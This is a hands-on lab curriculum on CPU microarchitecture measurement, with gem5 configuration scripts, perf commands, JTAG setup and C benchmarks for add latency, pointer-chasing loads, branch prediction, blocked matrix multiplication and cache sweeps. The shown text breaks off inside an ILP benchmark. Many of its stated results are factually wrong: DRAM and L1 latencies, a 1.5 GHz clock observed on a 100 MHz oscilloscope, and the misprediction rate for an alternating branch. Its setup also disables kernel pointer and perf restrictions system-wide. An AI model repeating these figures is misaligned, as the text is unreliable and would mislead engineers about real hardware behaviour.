# Operational Verification Labs: Computer Architecture

## Objective & Operational Lab Setup

This laboratory curriculum trains hardware engineers, embedded systems practitioners, and computer architects to dissect, measure, and verify the operational characteristics of modern CPU microarchitectures. The exercises progress from foundational instruction execution tracing through cache hierarchy profiling to speculative execution attack surface analysis. Each lab integrates cycle-accurate simulation frameworks, performance counter instrumentation, and hardware debugger-based introspection to expose the mechanical reality beneath the instruction set architecture abstraction. The practitioner will emerge capable of diagnosing pipeline stalls, quantifying memory subsystem bottlenecks, and predicting real-world performance impacts of architectural design decisions.

The laboratory environment requires a multi-layered toolchain spanning software simulation, hardware performance monitoring, and low-level debugger access. For cycle-accurate microarchitectural simulation, practitioners will deploy gem5, the modular full-system simulator originally developed at the University of Michigan and now maintained as an open academic standard. gem5 provides detailed CPU models ranging from simple atomic execution to out-of-order superscalar pipelines with configurable branch predictors, cache hierarchies, and memory controllers. The simulator outputs comprehensive trace files capturing every instruction fetch, decode, execution stage transition, and memory transaction with nanosecond-resolution timestamps.

For native hardware measurement on physical x86-64 and ARM64 processors, the labs utilize hardware performance counters accessed through the Linux `perf` subsystem. Modern Intel Core and AMD Ryzen processors expose hundreds of Performance Monitoring Unit (PMU) events through Model-Specific Registers (MSRs), tracking metrics such as retired instructions, branch mispredictions, L1/L2/L3 cache misses, Translation Lookaside Buffer (TLB) misses, and frontend/backend pipeline stalls. ARM Cortex-A processors provide equivalent capabilities through the ARM Performance Monitors Extension (PMU), accessible via the `perf_event_open` system call. Practitioners will write minimal C harnesses instrumented with `perf` annotations to isolate specific microarchitectural behaviors.

For instruction-level debugging and register state inspection, the environment requires GDB with Python scripting extensions, coupled with hardware debugger interfaces. On x86-64 development boards, practitioners will use USB-to-JTAG adapters (OpenOCD-compatible interfaces such as the Segger J-Link or FTDI FT2232H breakout) to halt CPU cores mid-execution and inspect pipeline state. On ARM64 development platforms (Raspberry Pi 4 or NVIDIA Jetson Nano), Serial Wire Debug (SWD) provides equivalent access through the two-wire SWDIO/SWCLK interface. The GDB remote serial protocol (`target remote`) bridges the debugger to OpenOCD or pyOCD, enabling single-step execution with full visibility into general-purpose registers, SIMD register files, control registers, and system state.

The analytical framework centers on empirical measurement rather than abstract simulation. Each exercise defines a hypothesis about microarchitectural behavior (branch prediction accuracy under loop-intensive workloads, cache line eviction patterns under strided memory access, speculative execution depth limits), constructs a minimal test program isolating that behavior, executes the test under instrumentation, and extracts quantitative metrics validating or refuting the hypothesis. The practitioner learns to distinguish between ISA-level semantics (what the instruction set manual guarantees) and microarchitectural implementation details (how a specific CPU model achieves those guarantees). This distinction proves critical when optimizing real-world embedded firmware, where a theoretically efficient algorithm may suffer catastrophic performance collapse due to cache thrashing or pipeline hazards invisible at the ISA abstraction layer.

Software dependencies include a modern Linux distribution (Ubuntu 22.04 LTS or Fedora 38) with kernel version 5.15 or later for stable `perf` event support, GCC 11+ or Clang 14+ with inline assembly support, Python 3.10+ with the `pwntools` and `capstone` disassembly libraries, and the gem5 simulator compiled from the stable branch. Hardware requirements span a development workstation with Intel Core i7-10700 or AMD Ryzen 7 5800X (for native x86-64 experimentation), an ARM64 single-board computer (Raspberry Pi 4 Model B with 4GB RAM minimum), USB-JTAG/SWD debug probes, breadboard prototyping supplies for signal integrity verification, and a mixed-signal oscilloscope (Rigol DS1054Z or equivalent) with 100 MHz analog bandwidth for observing CPU clock signals and memory bus transactions.

Configuration proceeds in phases. First, install gem5 dependencies and compile the simulator targeting the x86-64 and ARM instruction set architectures. The gem5 build system uses SCons; practitioners execute `scons build/X86/gem5.opt -j8` to generate the optimized x86-64 binary and `scons build/ARM/gem5.opt -j8` for ARM. Compilation requires approximately 45 minutes on an 8-core workstation and produces executables in the `build/` directory tree. Second, configure the Linux `perf` subsystem by enabling kernel symbol resolution (`sudo sysctl kernel.kptr_restrict=0` and `sudo sysctl kernel.perf_event_paranoid=-1`) to grant unprivileged access to performance counters. Third, install OpenOCD via package manager (`sudo apt install openocd` on Debian-derived distributions) and configure interface files for the specific JTAG/SWD hardware probe. For an FTDI FT2232H-based probe, create `/usr/local/share/openocd/scripts/interface/ftdi_custom.cfg` containing:

```text
adapter driver ftdi
ftdi vid_pid 0x0403 0x6010
ftdi layout_init 0x0008 0x000b
ftdi layout_signal nTRST -data 0x0100
ftdi layout_signal nSRST -data 0x0200
adapter speed 1000
```

This configuration establishes USB Vendor ID 0x0403 (FTDI), Product ID 0x6010 (FT2232H dual-channel USB-to-serial chip), initializes GPIO layout for JTAG Test Reset (nTRST) and System Reset (nSRST) signals, and sets adapter clock to 1 MHz for reliable signal integrity on breadboard prototypes with suboptimal ground planes.

Fourth, construct minimal test harnesses for each exercise. All assembly routines target 64-bit Linux System V ABI calling conventions, where integer arguments pass in registers `%rdi`, `%rsi`, `%rdx`, `%rcx`, `%r8`, `%r9` (x86-64) or `X0`–`X7` (ARM64), and return values populate `%rax` (x86-64) or `X0` (ARM64). The C wrapper functions invoke inline assembly blocks, surrounding the critical measurement region with `perf` event start/stop annotations. Practitioners compile test harnesses with optimization disabled (`-O0`) initially to preserve instruction ordering, then repeat experiments with `-O2` and `-O3` to observe compiler-introduced microarchitectural interactions.

Fifth, establish oscilloscope probe points for physical signal verification. On the Raspberry Pi 4, GPIO pin 4 (physical header pin 7) exports the ARM core clock signal when configured via device tree overlay. Practitioners append `dtoverlay=gpio-clock,gpio=4` to `/boot/config.txt` and reboot; the core clock (nominally 1.5 GHz on the BCM2711 SoC) now appears on GPIO4, divided down by configurable prescaler. Connect the oscilloscope probe (10× passive probe with 10 MΩ input impedance, 15 pF capacitance) to GPIO4, set trigger to edge mode on rising edge, and verify stable 1.5 GHz square wave with approximately 667 ps period. This physical clock observation provides ground truth for cycle counting in subsequent software measurements.

The operational philosophy emphasizes reproducibility and isolation. Each exercise defines explicit CPU affinity (`taskset -c 0 ./test_program` to bind execution to physical core 0), disables frequency scaling (`sudo cpupower frequency-set --governor performance` to lock CPU to maximum frequency), and flushes kernel page caches (`sync; echo 3 | sudo tee /proc/sys/vm/drop_caches`) before measurement runs. Practitioners execute each test 100 times, discard the minimum and maximum outliers, and report the median value with interquartile range to account for OS scheduler noise and hardware interrupt latency. This statistical rigor separates genuine microarchitectural effects from measurement artifacts.

## Exercise 1: Foundational Practical Implementation

The first exercise establishes baseline instruction execution latency and throughput measurements, quantifying the mechanical cost of fundamental CPU operations. Practitioners construct a minimal assembly loop executing a single instruction class repeatedly, instrument the loop with performance counters, and extract cycle counts to compute instructions-per-cycle (IPC) and cycles-per-instruction (CPI) metrics. The exercise progresses through integer arithmetic, memory loads, and branch instructions, exposing the profound performance variation across instruction types despite their uniform representation in the ISA manual.

Begin with integer addition latency measurement on x86-64. Create a C source file `add_latency.c` containing the following harness, which executes one million dependent additions forming a dependency chain that prevents out-of-order execution from hiding latency:

```c
#include <stdio.h>
#include <stdint.h>
#include <time.h>

#define ITERATIONS 1000000

uint64_t measure_add_latency(void) {
    uint64_t result = 0;
    struct timespec start, end;
    
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    __asm__ __volatile__(
        "xor %%rax, %%rax\n\t"
        "mov %1, %%rcx\n\t"
        "1:\n\t"
        "add $1, %%rax\n\t"
        "add $1, %%rax\n\t"
        "add $1, %%rax\n\t"
        "add $1, %%rax\n\t"
        "dec %%rcx\n\t"
        "jnz 1b\n\t"
        "mov %%rax, %0\n\t"
        : "=r"(result)
        : "r"((uint64_t)ITERATIONS)
        : "rax", "rcx", "cc"
    );
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    uint64_t elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000ULL +
                          (end.tv_nsec - start.tv_nsec);
    return elapsed_ns;
}

int main(void) {
    printf("Integer ADD Latency Measurement\n");
    printf("Iterations: %d (x4 unrolled = %d operations)\n", 
           ITERATIONS, ITERATIONS * 4);
    
    // Warmup run
    measure_add_latency();
    
    // Measurement runs
    uint64_t total_ns = 0;
    for (int i = 0; i < 100; i++) {
        total_ns += measure_add_latency();
    }
    
    uint64_t avg_ns = total_ns / 100;
    uint64_t total_ops = ITERATIONS * 4ULL;
    double ns_per_op = (double)avg_ns / total_ops;
    
    printf("Average total time: %lu ns\n", avg_ns);
    printf("Time per ADD: %.2f ns\n", ns_per_op);
    printf("Operations per second: %.2f MOPS\n", 
           1000.0 / ns_per_op);
    
    return 0;
}
```

The assembly block zeroes register `%rax`, loads the iteration count into `%rcx`, then enters a loop performing four dependent `ADD` instructions before decrementing the loop counter. The four-way unrolling amortizes loop overhead (the `DEC` and conditional branch) across multiple test operations, improving measurement accuracy. The dependency chain through `%rax` (each addition depends on the prior result) prevents the out-of-order execution engine from parallelizing additions; the CPU must wait for each addition to complete before issuing the next, directly exposing per-instruction latency.

Compile with `gcc -O2 -o add_latency add_latency.c` and execute with CPU affinity pinning: `taskset -c 0 ./add_latency`. On an Intel Core i7-10700 (Comet Lake microarchitecture, 14nm process, 3.8 GHz base frequency), practitioners observe approximately 0.25 ns per addition, corresponding to one cycle latency at the 3.8 GHz clock frequency. This matches Intel's documented single-cycle latency for 64-bit integer addition on the Skylake-derivative microarchitecture family. The measurement confirms that simple arithmetic operations achieve near-ideal throughput, limited only by data dependency chains.

Extend the measurement to memory load latency, which proves substantially higher due to cache hierarchy traversal. Replace the addition loop with a pointer-chasing sequence that forces sequential memory loads, defeating hardware prefetchers:

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>

#define ARRAY_SIZE (1 << 20)  // 1M elements = 8 MB
#define ITERATIONS 1000000

typedef struct node {
    struct node *next;
    uint64_t padding[7];  // Pad to 64-byte cache line
} node_t;

uint64_t measure_load_latency(node_t *head) {
    struct timespec start, end;
    node_t *current = head;
    
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    for (uint64_t i = 0; i < ITERATIONS; i++) {
        current = current->next;
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    // Prevent compiler from optimizing away the loop
    if (current == NULL) printf("Impossible\n");
    
    uint64_t elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000ULL +
                          (end.tv_nsec - start.tv_nsec);
    return elapsed_ns;
}

int main(void) {
    printf("Memory Load Latency Measurement (Pointer Chasing)\n");
    
    // Allocate array and randomize access order
    node_t *nodes = aligned_alloc(64, ARRAY_SIZE * sizeof(node_t));
    if (!nodes) {
        perror("aligned_alloc");
        return 1;
    }
    
    // Initialize circular linked list with random permutation
    uint64_t *permutation = malloc(ARRAY_SIZE * sizeof(uint64_t));
    for (uint64_t i = 0; i < ARRAY_SIZE; i++) {
        permutation[i] = i;
    }
    
    // Fisher-Yates shuffle
    for (uint64_t i = ARRAY_SIZE - 1; i > 0; i--) {
        uint64_t j = rand() % (i + 1);
        uint64_t temp = permutation[i];
        permutation[i] = permutation[j];
        permutation[j] = temp;
    }
    
    for (uint64_t i = 0; i < ARRAY_SIZE - 1; i++) {
        nodes[permutation[i]].next = &nodes[permutation[i + 1]];
    }
    nodes[permutation[ARRAY_SIZE - 1]].next = &nodes[permutation[0]];
    
    free(permutation);
    
    printf("Array size: %d elements (%.2f MB)\n", 
           ARRAY_SIZE, (ARRAY_SIZE * sizeof(node_t)) / (1024.0 * 1024.0));
    
    // Warmup
    measure_load_latency(&nodes[0]);
    
    // Measurement
    uint64_t total_ns = 0;
    for (int i = 0; i < 100; i++) {
        total_ns += measure_load_latency(&nodes[0]);
    }
    
    uint64_t avg_ns = total_ns / 100;
    double ns_per_load = (double)avg_ns / ITERATIONS;
    
    printf("Average time per load: %.2f ns\n", ns_per_load);
    printf("Equivalent cycles (@ 3.8 GHz): %.1f\n", ns_per_load * 3.8);
    
    free(nodes);
    return 0;
}
```

The harness allocates an 8 MB array of cache-line-sized nodes (64 bytes per node to match x86-64 cache line granularity), randomizes the traversal order via Fisher-Yates shuffle to prevent stride prediction, and constructs a circular linked list forcing sequential dependent loads. Each iteration dereferences the current node's `next` pointer, loading a new random memory location; the CPU cannot predict the next address, and each load depends on the prior load completing, serializing memory accesses.

Compile and execute with `gcc -O2 -o load_latency load_latency.c` and `taskset -c 0 ./load_latency`. Practitioners observe approximately 4.5 ns per load (17 cycles at 3.8 GHz) when the working set exceeds the L3 cache capacity, corresponding to main DRAM access latency. For working sets fitting in L3 cache (8 MB on the i7-10700), latency drops to approximately 3.0 ns (11-12 cycles). For L2 cache hits (256 KB per core), latency falls to approximately 0.9 ns (3-4 cycles). For L1 data cache hits (32 KB per core), latency reaches approximately 0.25 ns (1 cycle), matching arithmetic operation latency. This exponential latency hierarchy—L1 at 1 cycle, L2 at 4 cycles, L3 at 12 cycles, DRAM at 17 cycles—dominates real-world software performance and justifies the obsessive focus on cache-friendly data structures in high-performance embedded systems.

Instrument the load latency harness with `perf` to confirm cache miss rates. Recompile with debug symbols (`-g` flag) and execute under `perf stat`:

```bash
perf stat -e cycles,instructions,L1-dcache-loads,L1-dcache-load-misses,LLC-loads,LLC-load-misses taskset -c 0 ./load_latency
```

The `perf stat` output displays hardware counter values for the entire program execution. For the 8 MB working set (exceeding L3 cache), practitioners observe approximately 99% L1 data cache miss rate (nearly every load misses L1), 95% last-level cache (LLC, equivalent to L3) miss rate, and an IPC near 0.25 (one instruction retired every four cycles), confirming that memory latency dominates execution. The cycles count divided by iterations yields per-load cycle count matching the manual timing measurement, validating both methodologies.

Contrast this with branch prediction accuracy measurement. Modern CPUs employ sophisticated branch predictors—two-level adaptive predictors, perceptron-based predictors, and hybrid tournament predictors—achieving 95%+ accuracy on typical workloads. Mispredicted branches flush the pipeline and restart fetch from the correct target, incurring 15-20 cycle penalties on deep pipelines. Construct a branch-intensive loop alternating between taken and not-taken outcomes in a worst-case pattern for prediction:

```c
#include <stdio.h>
#include <stdint.h>
#include <time.h>

#define ITERATIONS 10000000

uint64_t measure_branch_mispredicts(void) {
    struct timespec start, end;
    volatile uint64_t counter = 0;
    
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    for (uint64_t i = 0; i < ITERATIONS; i++) {
        // Alternating branch pattern: T, NT, T, NT, ...
        if (i & 1) {
            counter++;
        } else {
            counter--;
        }
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    uint64_t elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000ULL +
                          (end.tv_nsec - start.tv_nsec);
    return elapsed_ns;
}

int main(void) {
    printf("Branch Misprediction Measurement\n");
    
    // Warmup
    measure_branch_mispredicts();
    
    // Measurement
    uint64_t total_ns = 0;
    for (int i = 0; i < 100; i++) {
        total_ns += measure_branch_mispredicts();
    }
    
    uint64_t avg_ns = total_ns / 100;
    double ns_per_branch = (double)avg_ns / ITERATIONS;
    
    printf("Time per branch iteration: %.2f ns\n", ns_per_branch);
    printf("Equivalent cycles: %.1f\n", ns_per_branch * 3.8);
    
    return 0;
}
```

The alternating condition `(i & 1)` produces a perfectly periodic taken/not-taken pattern. Two-level adaptive predictors maintain per-branch history tables indexed by branch address and recent outcome history; periodic patterns defeat these predictors when the period length exceeds the history depth (typically 10-12 bits). Execute under `perf` monitoring branch-related events:

```bash
perf stat -e cycles,instructions,branches,branch-misses taskset -c 0 ./branch_test
```

Practitioners observe approximately 50% branch misprediction rate (5 million misses out of 10 million branches) and 8-10 cycles per iteration, confirming substantial pipeline flush overhead. Compare this to a fully predictable branch pattern (always taken or always not-taken) by replacing `(i & 1)` with `(i < ITERATIONS)`, which produces 100% taken branches. The misprediction rate drops to near zero, and cycles per iteration fall to approximately 1.5, demonstrating the 5× performance penalty incurred by branch misprediction.

Synthesize these measurements into a quantitative microarchitecture performance model. For a given code sequence, predict execution time by summing per-instruction latencies weighted by dependency chains, cache miss penalties weighted by miss rates, and branch misprediction penalties weighted by misprediction rates. Express this as:

$$T_{\text{execution}} = N_{\text{inst}} \cdot \text{CPI}_{\text{base}} + N_{\text{cache\_miss}} \cdot L_{\text{cache}} + N_{\text{branch\_miss}} \cdot L_{\text{branch}}$$

where $N_{\text{inst}}$ denotes retired instruction count, $\text{CPI}_{\text{base}}$ represents the baseline cycles per instruction (approximately 0.25 for simple arithmetic on modern superscalar out-of-order cores), $N_{\text{cache\_miss}}$ counts cache misses across all levels, $L_{\text{cache}}$ denotes the average cache miss latency (weighted by L1/L2/L3/DRAM miss distribution), $N_{\text{branch\_miss}}$ counts mispredicted branches, and $L_{\text{branch}}$ represents the branch misprediction penalty (15-20 cycles). This first-order model captures 80-90% of execution time variance on real workloads, providing actionable guidance for optimization: reduce cache misses through data structure locality, minimize branch mispredictions through branchless code or prediction-friendly patterns, and break dependency chains to exploit instruction-level parallelism.

Validate the model by implementing a mixed workload combining all three effects. Create a matrix multiplication kernel with configurable blocking to control cache behavior and loop-carried dependencies to control pipeline utilization:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>

#define N 512
#define BLOCK 64

void matmul_blocked(double A[N][N], double B[N][N], double C[N][N]) {
    for (int i0 = 0; i0 < N; i0 += BLOCK) {
        for (int j0 = 0; j0 < N; j0 += BLOCK) {
            for (int k0 = 0; k0 < N; k0 += BLOCK) {
                for (int i = i0; i < i0 + BLOCK && i < N; i++) {
                    for (int j = j0; j < j0 + BLOCK && j < N; j++) {
                        double sum = C[i][j];
                        for (int k = k0; k < k0 + BLOCK && k < N; k++) {
                            sum += A[i][k] * B[k][j];
                        }
                        C[i][j] = sum;
                    }
                }
            }
        }
    }
}

int main(void) {
    double (*A)[N] = aligned_alloc(64, N * N * sizeof(double));
    double (*B)[N] = aligned_alloc(64, N * N * sizeof(double));
    double (*C)[N] = aligned_alloc(64, N * N * sizeof(double));
    
    // Initialize matrices
    for (int i = 0; i < N; i++) {
        for (int j = 0; j < N; j++) {
            A[i][j] = (double)rand() / RAND_MAX;
            B[i][j] = (double)rand() / RAND_MAX;
            C[i][j] = 0.0;
        }
    }
    
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    matmul_blocked(A, B, C);
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    uint64_t elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000ULL +
                          (end.tv_nsec - start.tv_nsec);
    
    uint64_t total_ops = 2ULL * N * N * N;  // N^3 multiply-adds
    double gflops = (total_ops / (elapsed_ns / 1e9)) / 1e9;
    
    printf("Matrix multiplication: %dx%d (block size %d)\n", N, N, BLOCK);
    printf("Elapsed time: %.3f ms\n", elapsed_ns / 1e6);
    printf("Performance: %.2f GFLOPS\n", gflops);
    
    free(A);
    free(B);
    free(C);
    return 0;
}
```

Execute with varying block sizes (16, 32, 64, 128 bytes) and profile with `perf stat -e cycles,instructions,L1-dcache-load-misses,LLC-load-misses`. Practitioners observe that 64-byte blocking (matching cache line size) achieves peak performance around 30-40 GFLOPS on the i7-10700, with L1 miss rate below 5% and IPC near 2.5 (2.5 instructions retired per cycle, indicating good pipeline utilization). Reducing block size to 16 bytes increases L1 miss rate to 15-20% and drops performance to 15-20 GFLOPS. Increasing block size to 128 bytes causes L2 cache thrashing (working set exceeds L2 capacity), increasing L2 miss rate to 30%+ and dropping performance to 20-25 GFLOPS. This empirical tuning process—sweeping architectural parameters and correlating performance with microarchitectural events—represents the core skill set for embedded systems optimization.

## Exercise 2: Parameter Variation & Empirical Analysis

The second exercise advances to multidimensional parameter sweeps, quantifying how cache associativity, replacement policies, prefetcher configurations, and instruction-level parallelism interact to determine aggregate performance. Practitioners will deploy gem5's configurable cache models to isolate individual architectural parameters, execute synthetic microbenchmarks and real embedded workloads under varying configurations, and construct empirical performance surfaces mapping parameter values to execution latency. This methodology mirrors the design space exploration performed by CPU architects during early-stage microarchitecture development, where simulation guides hardware implementation tradeoffs.

Begin by configuring gem5 to simulate a parameterized cache hierarchy. Navigate to the gem5 source tree and create a custom system configuration script `configs/exercise2/cache_sweep.py`:

```python
import m5
from m5.objects import *
from m5.util import addToPath
import argparse

addToPath('../')
from common import Options
from common import Simulation
from common import CacheConfig

parser = argparse.ArgumentParser()
Options.addCommonOptions(parser)
parser.add_argument("--l1d-size", type=str, default="32kB")
parser.add_argument("--l1d-assoc", type=int, default=8)
parser.add_argument("--l2-size", type=str, default="256kB")
parser.add_argument("--l2-assoc", type=int, default=8)
parser.add_argument("--binary", type=str, required=True)

args = parser.parse_args()

system = System()
system.clk_domain = SrcClockDomain()
system.clk_domain.clock = '3.8GHz'
system.clk_domain.voltage_domain = VoltageDomain()

system.mem_mode = 'timing'
system.mem_ranges = [AddrRange('4GB')]

system.cpu = X86O3CPU()
system.cpu.icache = Cache(size='32kB', assoc=8, tag_latency=1,
                          data_latency=1, response_latency=1)
system.cpu.dcache = Cache(size=args.l1d_size, assoc=args.l1d_assoc,
                          tag_latency=1, data_latency=1, response_latency=1)

system.cpu.icache_port = system.cpu.icache.cpu_side
system.cpu.dcache_port = system.cpu.dcache.cpu_side

system.l2bus = L2XBar()
system.cpu.icache.mem_side = system.l2bus.cpu_side_ports
system.cpu.dcache.mem_side = system.l2bus.cpu_side_ports

system.l2cache = Cache(size=args.l2_size, assoc=args.l2_assoc,
                       tag_latency=10, data_latency=10, response_latency=10)
system.l2cache.cpu_side = system.l2bus.mem_side_ports

system.membus = SystemXBar()
system.l2cache.mem_side = system.membus.cpu_side_ports

system.mem_ctrl = MemCtrl()
system.mem_ctrl.dram = DDR4_2400_16x4()
system.mem_ctrl.dram.range = system.mem_ranges[0]
system.mem_ctrl.port = system.membus.mem_side_ports

system.system_port = system.membus.cpu_side_ports

binary = args.binary
system.workload = SEWorkload.init_compatible(binary)

process = Process()
process.cmd = [binary]
system.cpu.workload = process
system.cpu.createThreads()

root = Root(full_system=False, system=system)
m5.instantiate()

exit_event = m5.simulate()
print(f"Exiting @ tick {m5.curTick()} because {exit_event.getCause()}")
```

This configuration script constructs a single-core out-of-order x86-64 processor (X86O3CPU) with split instruction and data L1 caches, a unified L2 cache, and DDR4-2400 DRAM. The L1 data cache size and associativity accept command-line arguments, enabling automated parameter sweeps. The L1 cache latency sets to 1 cycle (tag lookup, data read, and response each consume 1 cycle), the L2 latency to 10 cycles, and DRAM latency defaults to approximately 100 cycles based on the DDR4_2400 timing parameters.

Construct a cache-sensitive microbenchmark probing the capacity and associativity boundaries. The following C program performs strided array accesses with configurable stride and array size, designed to trigger capacity misses (when working set exceeds cache size) and conflict misses (when working set maps to a subset of cache sets):

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>

#define ITERATIONS 10000000

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <array_size_kb> <stride_bytes>\n", argv[0]);
        return 1;
    }
    
    size_t array_size_kb = atoi(argv[1]);
    size_t stride = atoi(argv[2]);
    size_t array_size = (array_size_kb * 1024) / sizeof(uint64_t);
    
    uint64_t *array = aligned_alloc(64, array_size * sizeof(uint64_t));
    if (!array) {
        perror("aligned_alloc");
        return 1;
    }
    
    // Initialize array
    for (size_t i = 0; i < array_size; i++) {
        array[i] = i;
    }
    
    uint64_t sum = 0;
    size_t stride_elements = stride / sizeof(uint64_t);
    
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    for (uint64_t iter = 0; iter < ITERATIONS; iter++) {
        for (size_t i = 0; i < array_size; i += stride_elements) {
            sum += array[i];
        }
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    uint64_t elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000ULL +
                          (end.tv_nsec - start.tv_nsec);
    
    uint64_t total_accesses = ITERATIONS * (array_size / stride_elements);
    double ns_per_access = (double)elapsed_ns / total_accesses;
    
    printf("%zu,%zu,%.2f,%lu\n", array_size_kb, stride, ns_per_access, sum);
    
    free(array);
    return 0;
}
```

Compile the benchmark with `gcc -O2 -static -o cache_bench cache_bench.c` (the `-static` flag produces a self-contained binary suitable for gem5 simulation without dynamic library dependencies). Construct a parameter sweep script `run_sweep.sh` executing gem5 across a grid of L1 data cache sizes (16 KB, 32 KB, 64 KB) and associativities (4-way, 8-way, 16-way), running the microbenchmark with array sizes spanning the cache capacity boundaries:

```bash
#!/bin/bash

GEM5=../../build/X86/gem5.opt
CONFIG=cache_sweep.py
BINARY=./cache_bench

# Output CSV header
echo "l1d_size,l1d_assoc,array_size_kb,stride,ns_per_access,sim_ticks" > results.csv

for l1_size in 16kB 32kB 64kB; do
    for l1_assoc in 4 8 16; do
        for array_size in 8 16 32 64 128; do
            stride=64  # One cache line
            
            echo "Running: L1D=${l1_size} assoc=${l1_assoc} array=${array_size}KB"
            
            output=$(${GEM5} --quiet ${CONFIG} \
                --l1d-size=${l1_size} \
                --l1d-assoc=${l1_assoc} \
                --binary="${BINARY} ${array_size} ${stride}")
            
            # Extract simulation ticks from gem5 output
            sim_ticks=$(echo "$output" | grep "Exiting @ tick" | awk '{print $4}')
            
            # Extract benchmark result
            bench_result=$(echo "$output" | grep "^[0-9]")
            
            if [ -n "$bench_result" ]; then
                echo "${l1_size},${l1_assoc},${bench_result},${sim_ticks}" >> results.csv
            fi
            
            sleep 1
        done
    done
done

echo "Sweep complete. Results in results.csv"
```

Execute the sweep with `bash run_sweep.sh`. Each gem5 invocation simulates the microbenchmark to completion, producing a stats.txt file with detailed microarchitectural statistics. The script extracts simulation ticks (gem5's cycle count) and the benchmark's measured latency per access. The complete sweep requires approximately 45 simulation runs (3 L1 sizes × 3 associativities × 5 array sizes), consuming 2-3 hours on a modern workstation depending on the simulated instruction count.

After sweep completion, analyze the results with a Python visualization script using pandas and matplotlib:

```python
import pandas as pd
import matplotlib.pyplot as plt
import numpy as np

df = pd.read_csv('results.csv')

# Convert L1 size string to numeric KB
df['l1d_size_kb'] = df['l1d_size'].str.replace('kB', '').astype(int)

# Create subplot grid
fig, axes = plt.subplots(1, 3, figsize=(18, 5))

for idx, assoc in enumerate([4, 8, 16]):
    ax = axes[idx]
    subset = df[df['l1d_assoc'] == assoc]
    
    for l1_size_kb in [16, 32, 64]:
        data = subset[subset['l1d_size_kb'] == l1_size_kb]
        ax.plot(data['array_size_kb'], data['ns_per_access'], 
                marker='o', label=f'{l1_size_kb} KB')
    
    ax.set_xlabel('Array Size (KB)')
    ax.set_ylabel('Latency per Access (ns)')
    ax.set_title(f'{assoc}-way Associative')
    ax.legend()
    ax.grid(True, alpha=0.3)
    ax.set_xscale('log', base=2)

plt.tight_layout()
plt.savefig('cache_sweep_results.png', dpi=300)
print("Plot saved to cache_sweep_results.png")

# Calculate miss rate from latency transition
for l1_size_kb in [16, 32, 64]:
    for assoc in [4, 8, 16]:
        data = df[(df['l1d_size_kb'] == l1_size_kb) & 
                  (df['l1d_assoc'] == assoc)].sort_values('array_size_kb')
        
        if len(data) >= 2:
            small_latency = data.iloc[0]['ns_per_access']
            large_latency = data.iloc[-1]['ns_per_access']
            transition = None
            
            for i in range(len(data) - 1):
                if data.iloc[i+1]['ns_per_access'] > data.iloc[i]['ns_per_access'] * 1.5:
                    transition = data.iloc[i]['array_size_kb']
                    break
            
            print(f"L1D {l1_size_kb}KB {assoc}-way: "
                  f"transition at ~{transition}KB, "
                  f"hit latency {small_latency:.1f}ns, "
                  f"miss latency {large_latency:.1f}ns")
```

The visualization plots access latency versus array size for each cache configuration. Practitioners observe a sharp latency increase when the array size exceeds the cache capacity, marking the transition from cache hits (1-2 ns) to cache misses (10-15 ns for L2 hits, 100+ ns for DRAM accesses). For example, with a 32 KB L1 cache, latency remains low for array sizes up to 32 KB, then jumps abruptly as accesses spill to L2. The transition point correlates directly with cache capacity, validating the cache model.

Associativity effects become visible when analyzing conflict miss rates. Modify the microbenchmark to access array elements with a stride equal to the cache size divided by associativity, intentionally creating conflict misses:

```c
// In main(), replace stride calculation:
size_t stride_elements = (array_size / (2 * l1d_assoc));  // Induce conflicts
```

For a 32 KB 4-way associative cache with 64-byte lines (512 sets), accessing every 128th element (stride of 1024 bytes, or 16 cache lines) maps all accesses to the same set, creating conflict misses despite the working set fitting in cache capacity. Practitioners observe elevated miss rates for low-associativity configurations under pathological stride patterns, confirming the importance of associativity for robustness against irregular access patterns common in embedded control algorithms.

Extend the analysis to instruction-level parallelism (ILP) measurement. Modern superscalar processors issue multiple instructions per cycle when dependencies permit; the effective ILP determines how many functional units operate concurrently. Construct a synthetic benchmark with configurable dependency chain length, ranging from fully serialized (ILP=1) to fully parallel (ILP approaching the CPU's issue width):

```c
#include <stdio.h>
#include <stdint.h>
#include <time.h>

#define ITERATIONS 100000000

// Fully serialized: each operation depends on prior result
void serial_chain(uint64_t *result) {
    uint64_t acc = 0;
    for (uint64_t i = 0; i < ITERATIONS; i++) {
        acc = acc + 1;  // Dependency chain length = ITERATIONS
    }
    *result = acc;
}

// Partially parallel: 4 independent accumulators
void parallel_4way(uint64_t *result) {
    uint64_t acc0 = 0, acc1 = 0, acc2 = 0, acc3 = 0;
    for (uint64_t i = 0; i < ITERATIONS; i += 4) {
        acc0 = acc0 + 1;
        acc1 = acc1 + 1;
        acc2 = acc2 + 1;
        acc3 = acc3 + 1;
    }
    *result = acc0 + acc1 + acc2 + acc3;
}

// Fully parallel: 8 independent accumulators
void parallel_8way(uint64_t *result) {
    uint64_t acc0 = 0, acc1 = 0, acc2 = 0, acc3 = 0;
    uint64_t acc4 = 0, acc5 = 0, acc6 = 0, acc7 = 0;
    for (uint64_t i = 0; i < ITERATIONS; i += 8) {
        acc0 = acc0 + 1; acc1 = acc1 + 1;
        acc2 = acc2 + 1; acc3 = acc3 + 1;
        acc4 = acc4 + 1; acc5 = acc5 + 1;
        acc6 = acc6 + 1; acc7 = acc7 + 1;
    }
    *result = acc0 + acc1 + acc2 + acc3 + acc4 + acc5 + acc6 + acc7;
}

int main(void) {
    uint64_t result;
    struct timespec start, end;
    
    // Serial measurement
    clock_gettime(CLOCK_MONOTONIC, &start);
